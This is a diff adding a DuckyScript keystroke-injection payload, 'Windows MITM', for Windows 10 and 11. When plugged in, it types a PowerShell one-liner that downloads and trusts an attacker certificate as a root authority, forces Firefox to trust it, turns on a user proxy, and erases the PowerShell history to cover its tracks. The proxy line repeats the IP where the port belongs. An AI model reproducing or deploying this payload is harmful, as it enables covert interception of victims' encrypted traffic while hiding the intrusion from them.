@@ -1,0 +1,41 @@
+REM     Title: Windows MITM
+REM     Author: Who-Is-Julien
+REM     Description: This payload enable a proxy for the current user and make him trust the proxy certificate.
+REM     Target: Windows 10, 11
+
+DEFINE CERTURL http://127.0.0.1:8080/cert
+DEFINE IP 127.0.0.1
+DEFINE PORT 8080
+
+DELAY 2000
+CTRL GUI d
+
+DELAY 2000
+GUI x
+
+DELAY 2000
+STRING i
+
+DELAY 2000
+STRING try { $a = New-TemporaryFile; Invoke-WebRequest -Uri "
+STRING #CERTURL
+STRING " -OutFile $a; Import-Certificate -FilePath $a -CertStoreLocation "Cert:\CurrentUser\Root"; Remove-Item $a } finally { if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") { Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "prefs.js" -Recurse | ForEach-Object { (Get-Content $_.FullName) -replace '"security.enterprise_roots.enabled", false', '"security.enterprise_roots.enabled", true' | Set-Content $_.FullName } } @{"ProxyServer" = "
+STRING #IP
+STRING :
+STRING #IP
+STRING "; "ProxyEnable" = "1"}.GetEnumerator() | ForEach-Object { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name $_.Name -Value $_.Value; Remove-Item (Get-PSreadlineOption).HistorySavePath; exit } }
+
+DELAY 500
+ENTER
+
+DELAY 2000
+ALT TAB
+
+DELAY 2000
+TAB
+
+DELAY 500
+ENTER
+
+DELAY 500
+CTRL GUI F4
